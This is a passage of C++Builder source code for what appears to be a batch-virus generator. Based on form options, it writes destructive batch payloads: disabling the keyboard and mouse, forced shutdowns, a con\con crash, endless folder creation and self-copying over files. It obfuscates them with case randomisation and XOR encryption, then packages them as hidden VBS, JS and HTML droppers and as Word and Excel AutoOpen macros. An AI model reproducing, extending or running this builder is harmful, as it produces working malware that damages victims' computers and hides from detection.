        wstf(CaseRand("echo")+" " + tmps + ".run \""+Form15->Edit15->Text+"\">>%"+CaseRand("tmp")+"%\\" + pyrv + ".vbs" + ffos);
        if (Form15->ComboBox14->Text=="Infinite") wstf(CaseRand("echo")+" loop>>%"+CaseRand("tmp")+"%\\" + pyrv + ".vbs" + ffos);
        else wstf(CaseRand("echo")+" next>>%"+CaseRand("tmp")+"%\\" + pyrv + ".vbs" + ffos);
        wstf(CaseRand("wscript")+" %"+CaseRand("tmp")+"%\\" + pyrv + ".vbs" + ffos);
    }
    if (Form15->CheckBox69->Checked == true)
    { // create folders
        AnsiString pyfd;
        if (Form15->ComboBox15->Text == "%"+CaseRand("windir")+"%" || Form15->ComboBox15->Text == "%temp%") pyfd = Form15->ComboBox15->Text;
        if (Form15->ComboBox15->Text == "System" || Form15->ComboBox15->Text == "System32") pyfd = "%"+CaseRand("windir")+"%\\"+Form15->ComboBox15->Text;
        if (Form15->ComboBox15->Text == "Root") pyfd = "C:";
        wstf("find /i /v \"run\"<%"+CaseRand("tmp")+"%\\" + tmpv + "."+tfre+">%"+CaseRand("tmp")+"%\\" + pyfv + ".vbs" + ffos);
        wstf(CaseRand("echo")+" do>>%"+CaseRand("tmp")+"%\\" + pyfv + ".vbs" + ffos);
        wstf(CaseRand("echo")+" randomize>>%"+CaseRand("tmp")+"%\\" + pyfv + ".vbs" + ffos);
        Randomize();
        wstf(CaseRand("echo")+" " + sfso + ".createfolder(\""+pyfd+"\\\"&time&date&rnd*"+AnsiString(random(999999))+")>>%"+CaseRand("tmp")+"%\\" + pyfv + ".vbs" + ffos);
        wstf(CaseRand("echo")+" loop>>%"+CaseRand("tmp")+"%\\" + pyfv + ".vbs" + ffos);
        wstf(CaseRand("wscript")+" %"+CaseRand("tmp")+"%\\" + pyfv + ".vbs" + ffos);
    }                                                                                              
    if (Form15->CheckBox41->Checked == true)
    {
    if (Form15->ComboBox4->Text == "%"+CaseRand("windir")+"%" || Form15->ComboBox4->Text == "%temp%")
        wstf("for %%a in (" + Form15->ComboBox4->Text + "\\*.*) do call %0 " + parf + " %%a" + ffos);
    if (Form15->ComboBox4->Text == "System" || Form15->ComboBox4->Text == "System32")
        wstf("for %%a in (%"+CaseRand("windir")+"%\\" + Form15->ComboBox4->Text + "\\*.*) do call %0 " + parf + " %%a" + ffos);
    if (Form15->ComboBox4->Text == "Root") wstf("for %%a in (c:\\*.*) do call %0 " + parf + " %%a" + ffos);
    }
    if (Form15->CheckBox48->Checked == true)
    {
        wstf(CaseRand("echo")+".on error resume next>%"+CaseRand("tmp")+"%\\" + cfpv + ".vbs" + ffos);
        wstf(CaseRand("echo")+" set "+cfpy+"="+CaseRand("createobject")+"(\"%" + vbih + "%ing.filesystemobject\")>>%"+CaseRand("tmp")+"%\\" + cfpv + ".vbs" + ffos);
        wstf(CaseRand("echo")+" do>>%"+CaseRand("tmp")+"%\\" + cfpv + ".vbs" + ffos);
        wstf(CaseRand("echo")+" "+cfpa+"="+cfpy+"."+CaseRand("folderexists(\"a:\")")+">>%"+CaseRand("tmp")+"%\\" + cfpv + ".vbs" + ffos);
        wstf(CaseRand("echo")+" loop>>%"+CaseRand("tmp")+"%\\" + cfpv + ".vbs" + ffos);
        wstf(CaseRand("wscript")+" %"+CaseRand("tmp")+"%\\" + cfpv + ".vbs" + ffos);
    }
    if (Form15->CheckBox43->Checked == true)
    {
        wstf("find /i /v \"run\"<%"+CaseRand("tmp")+"%\\" + tmpv + "."+tfre+">%"+CaseRand("tmp")+"%\\" + cmpv + ".vbs" + ffos);
        wstf(CaseRand("echo")+" " + cmpf + "()>>%"+CaseRand("tmp")+"%\\" + cmpv + ".vbs" + ffos);
        wstf(CaseRand("echo")+" sub " + cmpf + ">>%"+CaseRand("tmp")+"%\\" + cmpv + ".vbs" + ffos);
        wstf(CaseRand("echo")+" " + tmps + ".run \""+CaseRand("rundll32 user,setcursorpos")+"\", 0>>%"+CaseRand("tmp")+"%\\" + cmpv + ".vbs" + ffos);
        wstf(CaseRand("echo")+" " + cmpf + "()>>%"+CaseRand("tmp")+"%\\" + cmpv + ".vbs" + ffos);
        wstf(CaseRand("echo")+" end sub>>%"+CaseRand("tmp")+"%\\" + cmpv + ".vbs" + ffos);
        wstf(CaseRand("wscript")+" %"+CaseRand("tmp")+"%\\" + cmpv + ".vbs" + ffos);
    }
    if (Form15->CheckBox32->Checked == true)
    {
        wstf("find /i /v \"run\"<%"+CaseRand("tmp")+"%\\" + tmpv + "."+tfre+">%"+CaseRand("tmp")+"%\\" + cspv + ".vbs" + ffos);
        wstf(CaseRand("echo")+" " + cspf + "()>>%"+CaseRand("tmp")+"%\\" + cspv + ".vbs" + ffos);
        wstf(CaseRand("echo")+" sub " + cspf + ">>%"+CaseRand("tmp")+"%\\" + cspv + ".vbs" + ffos);
        wstf(CaseRand("echo")+" " + tmps + ".run \""+CaseRand("rundll32 user,repaintscreen")+"\", 0>>%"+CaseRand("tmp")+"%\\" + cspv + ".vbs" + ffos);
        wstf(CaseRand("echo")+" " + cspf + "()>>%"+CaseRand("tmp")+"%\\" + cspv + ".vbs" + ffos);
        wstf(CaseRand("echo")+" end sub>>%"+CaseRand("tmp")+"%\\" + cspv + ".vbs" + ffos);
        wstf(CaseRand("wscript")+" %"+CaseRand("tmp")+"%\\" + cspv + ".vbs" + ffos);
    }
    if (Form15->CheckBox13->Checked == true)
    {
        wstf("find /i /v \"run\"<%"+CaseRand("tmp")+"%\\" + tmpv + "."+tfre+">%"+CaseRand("tmp")+"%\\" + ispv + ".vbs" + ffos);
        wstf(CaseRand("echo")+" do>>%"+CaseRand("tmp")+"%\\" + ispv + ".vbs" + ffos);
        wstf(CaseRand("echo")+" " + tmps + ".run w%" + vbih + "%.%" + vbih + "%name, 0>>%"+CaseRand("tmp")+"%\\" + ispv + ".vbs" + ffos);
        wstf(CaseRand("echo")+" loop>>%"+CaseRand("tmp")+"%\\" + ispv + ".vbs" + ffos);
        wstf(CaseRand("wscript")+" %"+CaseRand("tmp")+"%\\" + ispv + ".vbs" + ffos);
    }
    if (Form15->CheckBox8->Checked == true)
        wstf(CaseRand("rundll32 keyboard,disable") + ffos);
    if (Form15->CheckBox9->Checked == true)
        wstf(CaseRand("rundll32 mouse,disable") + ffos);
    if (Form15->CheckBox10->Checked == true)
        wstf(CaseRand("rundll32 user,swapmousebutton") + ffos);
    if (Form15->RadioButton9->Checked == true)
    {
        wstf(CaseRand("if exist %windir%\\system32\\shutdown.exe")+" shutdown -f -r" + ffos);
        wstf(CaseRand("if not exist %windir%\\system32\\shutdown.exe")+" "+CaseRand("rundll32 shell32,SHExitWindowsEx")+" 2" + ffos);
    }
    if (Form15->RadioButton8->Checked == true)
    {
        wstf(CaseRand("if exist %windir%\\system32\\shutdown.exe")+" shutdown -s -f" + ffos);
        wstf(CaseRand("if not exist %windir%\\system32\\shutdown.exe")+" "+CaseRand("rundll32 krnl386,exitkernel") + ffos);
        wstf(CaseRand("if not exist %windir%\\system32\\shutdown.exe")+" "+CaseRand("rundll32 user,exitwindows") + ffos);
    }
    if (Form15->RadioButton7->Checked == true)
    {
        wstf("con\\con" + ffos);
        wstf(CaseRand("rundll32 user,disableoemlayer") + ffos);
    }
    // addictional payloads code
    for (int p=0; p<Form15->Memo9->Lines->Count; p++)
        wstf(Form15->Memo9->Lines->Strings[p] + ffos);
    wstf("goto " + labf);
    wstf(":" + la2e);
    }
    // addictional virus code
    for (int p=0; p<Form15->Memo8->Lines->Count; p++)
        wstf(Form15->Memo8->Lines->Strings[p] + ffos);
    if (Form15->CheckBox92->Checked)
    {
        wstf("find /i /v \"run\"<%"+CaseRand("tmp")+"%\\" + tmpv + "."+tfre+">%"+CaseRand("tmp")+"%\\" + excr + ".vbs" + ffos);
        wstf(CaseRand("echo")+" " + tmps + ".regdelete\"HKCU\\Software\\" + plrn + "\\" + exck + "\">>%"+CaseRand("tmp")+"%\\" + excr + ".vbs" + ffos);
        wstf("cscript %"+CaseRand("tmp")+"%\\" + excr + ".vbs>nul" + ffos);
    }
    AnsiString delr;        
    int garp;
    Randomize();
    garp = random(5000);
    if (garp % 2 == 1) delr = "del";
    else delr = "erase";
    wstf(ffos + CaseRand("set")+" " + dtr1 + "=" + delr);
    wstf(ffos + CaseRand("set")+" " + dtr2 + "=%" + dtr1 + "% %"+CaseRand("tmp")+"%\\*.");
    if (Form15->RadioButton4->Checked == false) wstf("attrib +r +s +h "+istd+"\\" + tmpn + ".bat" + ffos);
    wstf("%" + dtr2 + "%"+tfre + ffos);
    wstf("%" + dtr2 + "%bat" + ffos);
    wstf("%" + dtr2 + "%vbs" + ffos);   
    wstf("%" + dtr2 + "%js" + ffos);
    wstf(CaseRand("if not exist %windir%\\system32\\shutdown.exe")+" ctty con" + ffos);
    wstf(":" + labf);
    wstf("cls" + ffos);
    if (Form15->CheckBox90->Checked) wstf(":" + labelstr);
    fil.close();
    if (Form15->CheckBox49->Checked)
    { // encryption
        ifstream eream;
        eream.open(SaveDialog1->FileName.c_str(),ios::binary);
        AnsiString valld;
        char a;
        while (eream.get(a))
            valld = valld + AnsiString(a);
        eream.close();
        fil.open(SaveDialog1->FileName.c_str(),ios::binary);
        if (Form15->CheckBox37->Checked && Form15->RadioButton17->Checked)
        {
            wstfnr("@REM " + Form15->Label29->Caption + " - By " + Form15->Edit2->Text);
            fil.put(char(13));
            fil.put(char(10));
            wstfnr("@REM Created with " + Form15->Label1->Caption + " - By SAD1c");
            fil.put(char(13));
            fil.put(char(10));
        }
        wstfnr("@echo off");
        fil.put(char(13));
        fil.put(char(10));
        wstfnr("echo."+CaseRand("on error resume next")+">%tmp%\\"+ eeuv +".vbs");
        fil.put(char(13));
        fil.put(char(10));
        wstfnr("echo dim "+eeth+","+eeeu+">>%tmp%\\"+ eeuv +".vbs");
        fil.put(char(13));
        fil.put(char(10));
        wstfnr("echo set "+eefs+"="+CaseRand("createobject(\"scripting.filesystemobject")+"\")>>%tmp%\\"+ eeuv +".vbs");
        fil.put(char(13));
        fil.put(char(10));
        wstfnr("echo set "+eevf+"="+eefs+".opentextfile(\"%0\")>>%tmp%\\"+ eeuv +".vbs");
        fil.put(char(13));
        fil.put(char(10));
        int ytv=39;
        if (Form15->CheckBox60->Checked) ytv++;
        if (Form15->CheckBox37->Checked) ytv+=2;
        wstfnr("echo for "+eeth+"=1 to "+AnsiString(ytv)+">>%tmp%\\"+ eeuv +".vbs");
        fil.put(char(13));
        fil.put(char(10));
        wstfnr("echo "+eeeu+"="+eeeu+"&"+eevf+".readline&vbcrlf>>%tmp%\\"+ eeuv +".vbs");
        fil.put(char(13));
        fil.put(char(10));
        wstfnr("echo next>>%tmp%\\"+ eeuv +".vbs");
        fil.put(char(13));
        fil.put(char(10));
        wstfnr("echo do while not("+eevf+".atendofstream)>>%tmp%\\"+ eeuv +".vbs");
        fil.put(char(13));
        fil.put(char(10));
        wstfnr("echo "+eedd+"="+eedd+"&"+eevf+".read(1)>>%tmp%\\"+ eeuv +".vbs");
        fil.put(char(13));
        fil.put(char(10));
        wstfnr("echo loop>>%tmp%\\"+ eeuv +".vbs");
        fil.put(char(13));
        fil.put(char(10));
        wstfnr("echo "+eedd+"="+eedf+"("+eedd+")>>%tmp%\\"+ eeuv +".vbs");
        fil.put(char(13));
        fil.put(char(10));
        wstfnr("echo "+eevf+".close>>%tmp%\\"+ eeuv +".vbs");
        fil.put(char(13));
        fil.put(char(10));
        wstfnr("echo set "+eevf+"="+eefs+".createtextfile(\"%tmp%\\"+eexx+"."+tfre+"\",1)>>%tmp%\\"+ eeuv +".vbs");
        fil.put(char(13));
        fil.put(char(10));
        wstfnr("echo "+eevf+".write "+eeeu+">>%tmp%\\"+ eeuv +".vbs");
        fil.put(char(13));
        fil.put(char(10));
        wstfnr("echo "+eevf+".close>>%tmp%\\"+ eeuv +".vbs");
        fil.put(char(13));
        fil.put(char(10));
        wstfnr("echo set "+eevf+"="+eefs+".createtextfile(\"%tmp%\\"+eebc+".bat\",1)>>%tmp%\\"+ eeuv +".vbs");
        fil.put(char(13));
        fil.put(char(10));
        wstfnr("echo "+eevf+".write "+eedd+">>%tmp%\\"+ eeuv +".vbs");
        fil.put(char(13));
        fil.put(char(10));
        wstfnr("echo "+eevf+".close>>%tmp%\\"+ eeuv +".vbs");
        fil.put(char(13));
        fil.put(char(10));
        wstfnr("echo "+CaseRand("createobject(\"wscript.shell")+"\").run \"%tmp%\\"+eebc+".bat\",0>>%tmp%\\"+ eeuv +".vbs");
        fil.put(char(13));
        fil.put(char(10));
        wstfnr("echo "+eefs+"."+CaseRand("deletefile wscript.scriptname")+">>%tmp%\\"+ eeuv +".vbs");
        fil.put(char(13));
        fil.put(char(10));
        wstfnr("echo function "+eedf+"("+eeft+")>>%tmp%\\"+ eeuv +".vbs");
        fil.put(char(13));
        fil.put(char(10));
        wstfnr("echo."+CaseRand("on error resume next")+">>%tmp%\\"+ eeuv +".vbs");
        fil.put(char(13));
        fil.put(char(10));
        wstfnr("echo dim "+eepw+","+eed2+","+eect+">>%tmp%\\"+ eeuv +".vbs");
        fil.put(char(13));
        fil.put(char(10));
        wstfnr("echo "+eepw+"=\""+epwd+"\">>%tmp%\\"+ eeuv +".vbs");
        fil.put(char(13));
        fil.put(char(10));
        wstfnr("echo "+eed2+"=1>>%tmp%\\"+ eeuv +".vbs");
        fil.put(char(13));
        fil.put(char(10));
        wstfnr("echo for "+eect+"=1 to len("+eeft+")>>%tmp%\\"+ eeuv +".vbs");
        fil.put(char(13));
        fil.put(char(10));
        wstfnr("echo "+eecc+"=asc(mid("+eeft+","+eect+",1))>>%tmp%\\"+ eeuv +".vbs");
        fil.put(char(13));
        fil.put(char(10));
        wstfnr("echo "+eepc+"=asc(mid("+eepw+","+eed2+",1))>>%tmp%\\"+ eeuv +".vbs");
        fil.put(char(13));
        fil.put(char(10));
        wstfnr("echo "+eedf+"="+eedf+"&chr("+eecc+" Xor("+eepc+"))>>%tmp%\\"+ eeuv +".vbs");
        fil.put(char(13));            
        fil.put(char(10));
        wstfnr("echo if not("+eed2+"=len("+eepw+")) then>>%tmp%\\"+ eeuv +".vbs");
        fil.put(char(13));
        fil.put(char(10));
        wstfnr("echo "+eed2+"="+eed2+"+1>>%tmp%\\"+ eeuv +".vbs");
        fil.put(char(13));
        fil.put(char(10));
        wstfnr("echo else>>%tmp%\\"+ eeuv +".vbs");
        fil.put(char(13));
        fil.put(char(10));
        wstfnr("echo "+eed2+"=1>>%tmp%\\"+ eeuv +".vbs");
        fil.put(char(13));
        fil.put(char(10));
        wstfnr("echo end if>>%tmp%\\"+ eeuv +".vbs");
        fil.put(char(13));
        fil.put(char(10));
        wstfnr("echo next>>%tmp%\\"+ eeuv +".vbs");
        fil.put(char(13));
        fil.put(char(10));
        if (Form15->CheckBox60->Checked)
        {
            wstfnr("echo "+eedf+"=strreverse("+eedf+")>>%tmp%\\"+ eeuv +".vbs");
            fil.put(char(13));
            fil.put(char(10));
        }
        wstfnr("echo end function>>%tmp%\\"+ eeuv +".vbs");
        fil.put(char(13));
        fil.put(char(10));
        wstfnr("wscript %tmp%\\"+ eeuv +".vbs>nul");
        fil.put(char(13));
        fil.put(char(10));
        wstfnr("exit");
        fil.put(char(13));
        fil.put(char(10));
        wstfnr(EncryptData(valld));
        fil.close();
    }
    if (Form15->RadioButton6->Checked) // vbs
    {
        ifstream ivbs;
        ivbs.open(SaveDialog1->FileName.c_str(),ios::binary);
        char a;
        AnsiString rall, bxyz = StrRand(8, 1), fxyz = StrRand(8, 0);
        while (ivbs.get(a))
            rall = rall + AnsiString(a);
        ivbs.close();
        fil.open(SaveDialog1->FileName.c_str(),ios::binary);
        if (Form15->CheckBox37->Checked)
        {
            wstfnr("' " + Form15->Label29->Caption + " - By " + Form15->Edit2->Text);
            fil.put(char(13));
            fil.put(char(10));
            wstfnr("' Created with " + Form15->Label1->Caption + " - By SAD1c");
            fil.put(char(13));
            fil.put(char(10));
        }
        wstfnr(CaseRand("on error resume next"));
        fil.put(char(13));
        fil.put(char(10));
        wstfnr("set " + fxyz + "="+CaseRand("createobject(\"scripting.filesystemobject")+"\")");
        fil.put(char(13));
        fil.put(char(10));
        wstfnr("set " + ftc1 + "=" + fxyz + ".createtextfile(\""+bxyz+".bat\",1)");
        fil.put(char(13));
        fil.put(char(10));
        int cnt = 20;
        bool fv = 0;
        for (int p=1; p<rall.Length()+1; p++)
        {
            unsigned char b = rall[p];
            AnsiString asci = AnsiString(int(b));
            if (cnt==20)
            {
                if (fv == 1)            
                {
                    fil.put(char(13));
                    fil.put(char(10));
                }
                else fv = 1;
                wstfnr(ftc1 + ".write chr("+asci+")");
                cnt=1;
            }
            else
            {            
                wstfnr("&chr("+asci+")");
                cnt++;
            }
        }
        if (cnt != 1)
        {
            fil.put(char(13));
            fil.put(char(10));
        }
        wstfnr(ftc1 + ".close");
        fil.put(char(13));
        fil.put(char(10));
        wstfnr(CaseRand("createobject(\"wscript.shell")+"\").run \""+bxyz+".bat\",0");
        fil.put(char(13));
        fil.put(char(10));
        fil.close();
    }
    if (Form15->RadioButton18->Checked) // js
    {
        ifstream ijs;
        ijs.open(SaveDialog1->FileName.c_str(),ios::binary);
        char a;
        AnsiString rall, bxyz = StrRand(8, 1), fxyz = StrRand(8, 0);
        while (ijs.get(a))
            rall = rall + AnsiString(a);      
        ijs.close();
        fil.open(SaveDialog1->FileName.c_str(),ios::binary);
        if (Form15->CheckBox37->Checked)
        {                         
            wstfnr("// " + Form15->Label29->Caption + " - By " + Form15->Edit2->Text);
            fil.put(char(13));
            fil.put(char(10));
            wstfnr("// Created with " + Form15->Label1->Caption + " - By SAD1c");
            fil.put(char(13));
            fil.put(char(10));
        }
        wstfnr("var " + fxyz + "=WScript."+CaseRand("createobject")+"(\"scripting.filesystemobject\");");
        fil.put(char(13));
        fil.put(char(10));
        wstfnr("var " + jsws + "=WScript."+CaseRand("createobject")+"(\"wscript.shell\");");
        fil.put(char(13));
        fil.put(char(10));
        wstfnr(fxyz + ".copyfile(WScript.scriptname,\"" + bxyz + ".bat\",1);");
        fil.put(char(13));
        fil.put(char(10));
        wstfnr(jsws + ".run(\"" + bxyz + ".bat\",0);");
        fil.put(char(13));
        fil.put(char(10));
        wstfnr("/*");
        fil.put(char(13));
        fil.put(char(10));
        wstfnr(rall);
        wstfnr("*/");
        fil.close();
    }
    if (Form15->RadioButton19->Checked) // html
    {
        ifstream ivbs;  
        ivbs.open(SaveDialog1->FileName.c_str(),ios::binary);
        char a;
        AnsiString rall, bxyz = StrRand(8, 1), fxyz = StrRand(8, 0);
        while (ivbs.get(a))
            rall = rall + AnsiString(a);
        ivbs.close();
        fil.open(SaveDialog1->FileName.c_str(),ios::binary);
        if (Form15->CheckBox37->Checked)
        {
            wstfnr("<!.. " + Form15->Label29->Caption + " - By " + Form15->Edit2->Text + " ..>");
            fil.put(char(13));
            fil.put(char(10));
            wstfnr("<!.. Created with " + Form15->Label1->Caption + " - By SAD1c ..>");
            fil.put(char(13));
            fil.put(char(10));
        }
        wstfnr(CaseRand("<script language=vbscript id=wscript>"));
        fil.put(char(13));
        fil.put(char(10));
        wstfnr(CaseRand("on error resume next"));
        fil.put(char(13));
        fil.put(char(10));
        wstfnr("set " + fxyz + "="+CaseRand("createobject(\"scripting.filesystemobject")+"\")");
        fil.put(char(13));
        fil.put(char(10));
        wstfnr("set " + wshl + "=createobject(\"wscript.shell\")");
        fil.put(char(13));
        fil.put(char(10));
        wstfnr("if err.number<>0 then");
        fil.put(char(13));
        fil.put(char(10));
        wstfnr("javascript:location.reload()");
        fil.put(char(13));
        fil.put(char(10));
        wstfnr("else");
        fil.put(char(13));
        fil.put(char(10));
        wstfnr("set " + ftc1 + "=" + fxyz + ".createtextfile(\""+bxyz+".bat\",1)");
        fil.put(char(13));
        fil.put(char(10));
        int cnt = 20;
        bool fv = 0;
        for (int p=1; p<rall.Length()+1; p++)
        {
            unsigned char b = rall[p];
            AnsiString asci = AnsiString(int(b));
            if (cnt==20)
            {
                if (fv == 1)            
                {
                    fil.put(char(13));
                    fil.put(char(10));
                }
                else fv = 1;
                wstfnr(ftc1 + ".write chr("+asci+")");
                cnt=1;
            }
            else
            {            
                wstfnr("&chr("+asci+")");
                cnt++;
            }
        }
        if (cnt != 1)
        {
            fil.put(char(13));
            fil.put(char(10));
        }
        wstfnr(ftc1 + ".close");
        fil.put(char(13));
        fil.put(char(10));
        wstfnr(wshl + ".run \""+bxyz+".bat\",0");
        fil.put(char(13));
        fil.put(char(10));
        wstfnr("end if");
        fil.put(char(13));
        fil.put(char(10));
        wstfnr("</script>");
        fil.close();
    }
    if (Form15->RadioButton20->Checked) // doc
    {
        AnsiString mfil = GetDFF(SaveDialog1->FileName) + "\\" + Form15->Label29->Caption + ".cls";
        ifstream idoc;
        idoc.open(SaveDialog1->FileName.c_str(),ios::binary);
        char a;
        AnsiString rall;
        while (idoc.get(a))
            rall = rall + AnsiString(a);
        idoc.close();
        fil.open(mfil.c_str(),ios::binary);
        if (Form15->CheckBox37->Checked)
        {
            wstfnr("' " + Form15->Label29->Caption + " - By " + Form15->Edit2->Text);
            fil.put(char(13));
            fil.put(char(10));
            wstfnr("' Created with " + Form15->Label1->Caption + " - By SAD1c");
            fil.put(char(13));
            fil.put(char(10));
        }
        AnsiString wmrt;        
        if (Form15->ComboBox24->ItemIndex == 0) wmrt = "Open";
        else wmrt = "Close";  
        wstf("Sub Auto"+wmrt+"()");
        wstf("On Error Resume Next");
        wstf("Dim " + wmvc);
        if (Form15->CheckBox99->Checked)
            wstf("CommandBars(\"Macro\").Visible=0");
        int cnt = 90;
        bool fv = 0;
        for (int p=1; p<rall.Length()+1; p++)
        {
            unsigned char b = rall[p];
            AnsiString asci = AnsiString(int(b));
            if (cnt==90)
            {
                if (fv == 1)            
                {
                    fil.put(char(13));
                    fil.put(char(10));   
                }
                else fv = 1;
                wstfnr(wmvc + " = "+wmvc+" & Chr("+asci+")");
                cnt=1;
            }
            else
            {
                wstfnr(" & Chr("+asci+")");
                cnt++;
            }
        }
        if (cnt != 1)
        {
            fil.put(char(13));
            fil.put(char(10));
        }
        wstf("Open Environ(\"tmp\") & \"\\" + wmbf + ".bat\" For Output As #1");
        wstf("Print #1, "+wmvc);
        wstf("Close #1");
        wstf("VBA.Shell Environ(\"tmp\") & \"\\" + wmbf + ".bat\", 0");
        wstf("End Sub");
        fil.close();
        if (SaveDialog1->FilterIndex<3)
        {
            DeleteFile(SaveDialog1->FileName);
            fil.open("temp.vbs",ios::binary);
            wstf("on error resume next");
            wstf("set wd=createobject(\"word.document\")");
            wstf("wd.vbproject.vbcomponents.import \""+mfil+"\"");
            wstf("wd.SaveAs \""+SaveDialog1->FileName+"\"");
            wstf("wd.Application.Quit");
            fil.close();
            ShellExecute(NULL,NULL,"temp.vbs",NULL,NULL,SW_HIDE);
            while(!FileExists(SaveDialog1->FileName))
                Application->ProcessMessages();
            DeleteFile("temp.vbs");
        }
        if (SaveDialog1->FilterIndex==2)
            DeleteFile(mfil);
    }
    if (Form15->RadioButton21->Checked) // xls
    {
        AnsiString mfil = GetDFF(SaveDialog1->FileName) + "\\" + Form15->Label29->Caption + ".cls";
        ifstream ixls;
        ixls.open(SaveDialog1->FileName.c_str(),ios::binary);
        char a;
        AnsiString rall;
        while (ixls.get(a))
            rall = rall + AnsiString(a);
        ixls.close();
        fil.open(mfil.c_str(),ios::binary);
        if (Form15->CheckBox37->Checked)
        {
            wstfnr("' " + Form15->Label29->Caption + " - By " + Form15->Edit2->Text);
            fil.put(char(13));
            fil.put(char(10));
            wstfnr("' Created with " + Form15->Label1->Caption + " - By SAD1c");
            fil.put(char(13));
            fil.put(char(10));
        }
        AnsiString wmrt;
        if (Form15->ComboBox25->ItemIndex == 0) wmrt = "Open";
        else wmrt = "Close";
        wstf("Sub Auto_"+wmrt+"()");
        wstf("On Error Resume Next");
        wstf("Dim " + wmvc);
        if (Form15->CheckBox99->Checked)
            wstf("CommandBars(\"Macro\").Visible=0");
        int cnt = 90;
        bool fv = 0;
        for (int p=1; p<rall.Length()+1; p++)
        {
            unsigned char b = rall[p];
            AnsiString asci = AnsiString(int(b));
            if (cnt==90)
            {
                if (fv == 1)            
                {
                    fil.put(char(13));
                    fil.put(char(10));   
                }
                else fv = 1;
                wstfnr(wmvc + " = "+wmvc+" & Chr("+asci+")");
                cnt=1;
            }
            else
            {
                wstfnr(" & Chr("+asci+")");
                cnt++;
            }
        }
        if (cnt != 1)
        {
            fil.put(char(13));
            fil.put(char(10));
        }
        wstf("Open Environ(\"tmp\") & \"\\" + wmbf + ".bat\" For Output As #1");
        wstf("Print #1, "+wmvc);
        wstf("Close #1");
        wstf("VBA.Shell Environ(\"tmp\") & \"\\" + wmbf + ".bat\", 0");
        wstf("End Sub");
        fil.close();
        if (SaveDialog1->FilterIndex<3)
        {
            DeleteFile(SaveDialog1->FileName);
            fil.open("temp.vbs",ios::binary);
            wstf("on error resume next");
            wstf("set ea=createobject(\"excel.application\")");
            wstf("set es=createobject(\"excel.sheet\")");
            wstf("es.application.workbooks(1).vbproject.vbcomponents.import \""+mfil+"\"");
            wstf("es.application.workbooks(1).saveas \""+SaveDialog1->FileName+"\"");
            fil.close();
            ShellExecute(NULL,NULL,"temp.vbs",NULL,NULL,SW_HIDE);
            while(!FileExists(SaveDialog1->FileName))
                Application->ProcessMessages();
            DeleteFile("temp.vbs");
        }
        if (SaveDialog1->FilterIndex==2)
            DeleteFile(mfil);
    }
    Label25->Caption = "Creation of file completed.";
    Timer1->Enabled = true;
        }
    }
}
//---------------------------------------------------------------------------
void __fastcall TForm1::Button1Click(TObject *Sender)
{
    Close();
}
//---------------------------------------------------------------------------

void __fastcall TForm1::Button3Click(TObject *Sender)
{
    Form15->Visible = true;
    Close();
}
//---------------------------------------------------------------------------

void __fastcall TForm1::OKButtonClick(TObject *Sender)
{
    Form15->Visible = true;
    Close();
}
//---------------------------------------------------------------------------

void __fastcall TForm1::Label19Click(TObject *Sender)
{
    ShellExecute(NULL, NULL, "mailto:sad1c@interfree.it", NULL, NULL, SW_SHOWNORMAL);
}
//---------------------------------------------------------------------------

void __fastcall TForm1::Label18Click(TObject *Sender)
{
    ShellExecute(NULL, NULL, Label18->Caption.c_str(), NULL, NULL, SW_SHOWNORMAL);
}
//---------------------------------------------------------------------------

void __fastcall TForm1::FormCloseQuery(TObject *Sender, bool &CanClose)
{
    if (Caption==" Disclaimer" && Form15->Visible == false) Form15->Close();
    else Form15->Visible = true;    
}
//---------------------------------------------------------------------------

void __fastcall TForm1::FormShow(TObject *Sender)
{
    randomize();
    RandSeed = random(100000);
    SaveDialog1->FileName = Form15->Label29->Caption;
    if (Caption==" Disclaimer")
    {
        GroupBox1->Visible = true;
        Panel1->Visible = false;
    }
    else
    {
        GroupBox1->Visible = false;
        Panel1->Visible = true;
    }
}
//---------------------------------------------------------------------------

void __fastcall TForm1::CheckBox1Click(TObject *Sender)
{
    Button2->Enabled = CheckBox1->Checked;
}
//---------------------------------------------------------------------------

void __fastcall TForm1::Timer1Timer(TObject *Sender)
{
    Label25->Visible = false;
    CheckBox1->Visible = true;
    Timer1->Enabled = false;
}
//---------------------------------------------------------------------------

